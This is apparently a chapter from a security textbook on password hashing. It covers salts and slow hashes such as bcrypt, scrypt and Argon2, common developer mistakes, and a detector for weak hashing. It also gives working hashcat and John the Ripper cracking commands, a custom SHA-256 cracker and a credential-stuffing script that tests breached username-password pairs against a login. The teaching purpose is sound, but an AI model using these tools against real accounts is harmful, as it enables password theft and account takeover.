# Chapter 5 — Passwords & Slow-Hash Logic

> *"LinkedIn stored 6.5 million passwords as unsalted SHA-1 hashes. When they were leaked in 2012, over 60% were cracked within 24 hours. The remaining 40% fell shortly after."*

---

## 5.1 Why Hashing ≠ Encrypting Passwords

Passwords must be **hashed**, not encrypted, because:

- Encryption is **reversible** — anyone with the key can recover all passwords
- Hashing is **one-way** — even the server can't recover the original password
- If the key leaks, encrypted passwords are instantly compromised; hashed passwords still require cracking

But not all hashes are created equal.

### The Speed Problem

```python
"""
The fundamental problem: general-purpose hashes are TOO FAST.
"""
import hashlib
import time

password = b"P@ssw0rd123!"

# SHA-256: ~5 million hashes/second on a single CPU core
# ~10 BILLION/second on a modern GPU (RTX 4090)
start = time.time()
for _ in range(1_000_000):
    hashlib.sha256(password).digest()
elapsed = time.time() - start

print(f"SHA-256: {1_000_000/elapsed:,.0f} hashes/sec (CPU)")
print(f"GPU estimate: ~10,000,000,000 hashes/sec")
print(f"8-char password (95 chars): {95**8:,.0f} combinations")
print(f"Time to brute-force on GPU: {95**8 / 10_000_000_000 / 3600:.1f} hours")
```

---

## 5.2 Rainbow Tables and Salts

### Rainbow Tables

A rainbow table is a precomputed lookup: `hash → password`.

```python
"""
Simplified rainbow table demonstration.
"""
import hashlib

# Precompute hashes for common passwords
wordlist = ["password", "123456", "admin", "letmein", "welcome",
            "monkey", "dragon", "master", "qwerty", "login"]

rainbow_table = {}
for word in wordlist:
    h = hashlib.sha256(word.encode()).hexdigest()
    rainbow_table[h] = word

# "Crack" a hash
target_hash = hashlib.sha256(b"dragon").hexdigest()
if target_hash in rainbow_table:
    print(f"Cracked: {target_hash[:16]}... → '{rainbow_table[target_hash]}'")
```

### Salt Defeats Rainbow Tables

A salt is a unique random value prepended to each password before hashing:

```python
import hashlib
import os

def hash_password_salted(password: str) -> tuple:
    """Hash a password with a unique salt."""
    salt = os.urandom(16)  # 128-bit random salt
    h = hashlib.sha256(salt + password.encode()).hexdigest()
    return salt.hex(), h

def verify_password(password: str, salt_hex: str, hash_hex: str) -> bool:
    salt = bytes.fromhex(salt_hex)
    h = hashlib.sha256(salt + password.encode()).hexdigest()
    return h == hash_hex

# Same password, different salts → different hashes
s1, h1 = hash_password_salted("password123")
s2, h2 = hash_password_salted("password123")

print(f"Hash 1: {h1[:32]}... (salt: {s1[:16]}...)")
print(f"Hash 2: {h2[:32]}... (salt: {s2[:16]}...)")
print(f"Same password, different hashes: {h1 != h2}")
```

**But salt alone is not enough** — the hash is still fast. The attacker just can't use precomputed tables; they still brute-force at GPU speed.

---

## 5.3 Slow Hashes: bcrypt, scrypt, Argon2

The solution is a **deliberately slow** hash function that makes brute-forcing expensive.

### bcrypt

```python
import bcrypt

password = b"hunter2"

# Hash (cost factor 12 = 2^12 = 4096 iterations)
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
print(f"bcrypt hash: {hashed.decode()}")

# Verify
assert bcrypt.checkpw(password, hashed)
print("Password verified ✓")

# Anatomy of a bcrypt hash:
# $2b$12$LJ3m4ys3Lg2VGqsMFGE0dOCDe4r2MVhVqpJPKQnuIgXn3Nq8WRWGS
# │  │  │  └─── 53-char base64: 16-byte salt + 24-byte hash
# │  │  └────── cost factor (2^12 iterations)
# │  └───────── version (2b)
# └──────────── algorithm identifier
```

### scrypt

```python
import hashlib
import os

password = b"hunter2"
salt = os.urandom(16)

# scrypt: CPU-hard AND memory-hard
# n=2^14, r=8, p=1 → ~16 MB memory, ~100ms
dk = hashlib.scrypt(password, salt=salt, n=2**14, r=8, p=1, dklen=32)
print(f"scrypt: {dk.hex()}")
```

### Argon2 (The Current Best)

```python
"""
Argon2 — winner of the Password Hashing Competition (2015).
Three variants:
  - Argon2d: data-dependent (GPU-resistant, but timing side-channel)
  - Argon2i: data-independent (side-channel resistant)
  - Argon2id: hybrid (recommended)
"""
from argon2 import PasswordHasher

ph = PasswordHasher(
    time_cost=3,        # iterations
    memory_cost=65536,   # 64 MB
    parallelism=4,       # threads
    hash_len=32,
    type=None            # Uses Argon2id by default
)

# Hash
hashed = ph.hash("hunter2")
print(f"Argon2id: {hashed}")

# Verify
assert ph.verify(hashed, "hunter2")
print("Verified ✓")

# Check if rehash needed (parameters changed)
if ph.check_needs_rehash(hashed):
    print("Parameters outdated — rehash on next login")
```

### Comparison

| Algorithm | CPU Hard | Memory Hard | GPU Resistant | Side-Channel Resistant |
|---|---|---|---|---|
| MD5/SHA-* | ❌ | ❌ | ❌ | N/A |
| bcrypt | ✅ | ❌ (4 KB) | Moderate | ⚠️ |
| scrypt | ✅ | ✅ | ✅ | ❌ |
| **Argon2id** | ✅ | ✅ | ✅ | ✅ |

---

## 5.4 Cracking Password Hashes

### Hashcat — The Standard Tool

```bash
# Identify hash type
hashcat --example-hashes | grep -A2 "SHA-256"
# Mode 1400 = SHA-256

# Dictionary attack
hashcat -m 1400 hashes.txt /usr/share/wordlists/rockyou.txt

# Dictionary + rules (mutations: l33t speak, appending numbers, etc.)
hashcat -m 1400 hashes.txt rockyou.txt -r rules/best64.rule

# Brute force: all 8-char lowercase+digits
hashcat -m 1400 hashes.txt -a 3 '?l?l?l?l?l?l?l?l'

# Mask attack: Company + 4 digits + special char
hashcat -m 1400 hashes.txt -a 3 'Company?d?d?d?d?s'

# bcrypt (mode 3200) — MUCH slower
hashcat -m 3200 bcrypt_hashes.txt rockyou.txt

# Show cracked passwords
hashcat -m 1400 hashes.txt --show
```

### John the Ripper

```bash
# Auto-detect hash type
john hashes.txt

# Wordlist mode
john --wordlist=rockyou.txt hashes.txt

# Incremental (brute force)
john --incremental hashes.txt

# Show cracked
john --show hashes.txt
```

### Custom Cracking Script

```python
"""
crack_hashes.py — Simple hash cracking framework.
Useful when you need custom logic (e.g., unusual hash constructions).
"""
import hashlib
import itertools
import string
import sys
import time

def crack_sha256(target_hash: str, mode: str = "wordlist",
                  wordlist_path: str = None, max_len: int = 6):
    """Attempt to crack a SHA-256 hash."""
    attempts = 0
    start = time.time()
    
    if mode == "wordlist" and wordlist_path:
        with open(wordlist_path, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                attempts += 1
                if hashlib.sha256(word.encode()).hexdigest() == target_hash:
                    elapsed = time.time() - start
                    print(f"[+] Cracked: {target_hash[:16]}... = '{word}'")
                    print(f"    Attempts: {attempts:,}  Time: {elapsed:.2f}s")
                    return word
    
    elif mode == "bruteforce":
        charset = string.ascii_lowercase + string.digits
        for length in range(1, max_len + 1):
            for combo in itertools.product(charset, repeat=length):
                candidate = ''.join(combo)
                attempts += 1
                if hashlib.sha256(candidate.encode()).hexdigest() == target_hash:
                    elapsed = time.time() - start
                    print(f"[+] Cracked: '{candidate}'")
                    print(f"    Attempts: {attempts:,}  Time: {elapsed:.2f}s")
                    return candidate
                if attempts % 1_000_000 == 0:
                    rate = attempts / (time.time() - start)
                    print(f"    {attempts:,} attempts ({rate:,.0f}/s)...",
                          end='\r')
    
    print(f"[-] Not cracked after {attempts:,} attempts")
    return None

# Example
target = hashlib.sha256(b"p4ssw0rd").hexdigest()
crack_sha256(target, mode="wordlist", wordlist_path="/usr/share/wordlists/rockyou.txt")
```

---

## 5.5 Common Developer Mistakes

### Mistake 1: Low Cost Factor

```python
# ❌ bcrypt with cost 4 — crackable at ~300,000 hashes/sec on GPU
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=4))

# ✅ bcrypt with cost 12+ — ~3 hashes/sec on GPU  
hashed = bcrypt.hashpw(password, bcrypt.gensalt(rounds=12))
```

### Mistake 2: Reused/Predictable Salt

```python
# ❌ Static salt — same as no salt (enables rainbow tables per-app)
h = hashlib.sha256(b"static_salt" + password).hexdigest()

# ❌ Username as salt — predictable, enables precomputation
h = hashlib.sha256(username.encode() + password).hexdigest()

# ✅ Random 16+ byte salt per password
salt = os.urandom(16)
h = hashlib.sha256(salt + password).hexdigest()
```

### Mistake 3: Rolling Your Own

```python
# ❌ "Double hashing" isn't twice as secure
h = hashlib.sha256(hashlib.sha256(password).digest()).hexdigest()

# ❌ Truncating the hash reduces security
h = hashlib.sha256(password).hexdigest()[:16]

# ❌ Custom PBKDF with low iterations
h = password
for _ in range(10):  # 10 iterations is nothing
    h = hashlib.sha256(h).digest()

# ✅ Just use argon2id
from argon2 import PasswordHasher
ph = PasswordHasher()
hashed = ph.hash(password)
```

### Detecting These Mistakes

```python
"""
audit_password_hashing.py — Check for weak password hashing patterns.
"""
import re
from pathlib import Path

ANTIPATTERNS = [
    (r'bcrypt\.gensalt\(rounds?\s*=\s*([1-9])\b', "bcrypt cost < 10"),
    (r'hashlib\.(md5|sha1|sha256)\(.*(password|passwd|pwd)',
     "Fast hash used for passwords"),
    (r'salt\s*=\s*["\']', "Hardcoded/static salt"),
    (r'sha256\(.*\+.*password', "SHA-256(x + password) without KDF"),
    (r'PBKDF2.*iterations?\s*=\s*(\d{1,4})\b', "PBKDF2 with < 10000 iterations"),
]

def audit_file(filepath: Path):
    content = filepath.read_text(errors='ignore')
    findings = []
    for pattern, desc in ANTIPATTERNS:
        for match in re.finditer(pattern, content, re.IGNORECASE):
            line = content[:match.start()].count('\n') + 1
            findings.append((line, desc, match.group(0)[:60]))
    return findings

# Scan a project
for pyfile in Path(".").rglob("*.py"):
    for line, desc, snippet in audit_file(pyfile):
        print(f"[!] {pyfile}:{line} {desc}")
        print(f"    {snippet}")
```

---

## 5.6 Credential Stuffing & Password Spraying

Beyond cracking hashes, stolen credentials enable automated attacks:

### Credential Stuffing

```python
"""
credential_stuffer.py — Test for credential reuse.
Uses breached credential pairs against a target login.
⚠️ Only use against authorized targets.
"""
import requests
import time
from concurrent.futures import ThreadPoolExecutor

def test_credential(target_url, username, password, session):
    """Test a single credential pair."""
    try:
        resp = session.post(target_url, data={
            "username": username,
            "password": password,
        }, timeout=10, allow_redirects=False)
        
        # Adjust success detection for your target
        if resp.status_code == 302 or "dashboard" in resp.text.lower():
            return (username, password, True)
    except Exception:
        pass
    return (username, password, False)

def credential_stuff(target_url, creds_file, threads=5, delay=1.0):
    """Test credential pairs from a file (user:pass format)."""
    session = requests.Session()
    valid = []
    
    with open(creds_file) as f:
        creds = [line.strip().split(':', 1) for line in f if ':' in line]
    
    print(f"Testing {len(creds)} credentials against {target_url}")
    
    for user, passwd in creds:
        result = test_credential(target_url, user, passwd, session)
        if result[2]:
            print(f"  [+] VALID: {user}:{passwd}")
            valid.append(result)
        time.sleep(delay)  # Rate limiting
    
    print(f"\n{len(valid)}/{len(creds)} valid credentials found")
    return valid
```

---

## 5.7 Key Takeaways

- **Never use fast hashes** (MD5, SHA-1, SHA-256) for passwords — they're designed to be fast, which is exactly what attackers want.
- **Argon2id** is the gold standard for password hashing.  bcrypt is acceptable.  scrypt is acceptable.
- **Cost parameters matter** — bcrypt rounds ≥ 12, Argon2 memory ≥ 64 MB.  Tune to ~250ms on your hardware.
- **Salt must be random and unique** per password.  Never static, never derived from username.
- **hashcat + rockyou.txt** cracks most weak hashes in minutes.  If your password would fall to a dictionary attack, it's too weak.
- **Credential stuffing** is the most common "password attack" in the wild — it doesn't require hash cracking at all.

---

**Next:** [Chapter 6 — Side-Channels: Timing and Compression →](06_side_channels.md)
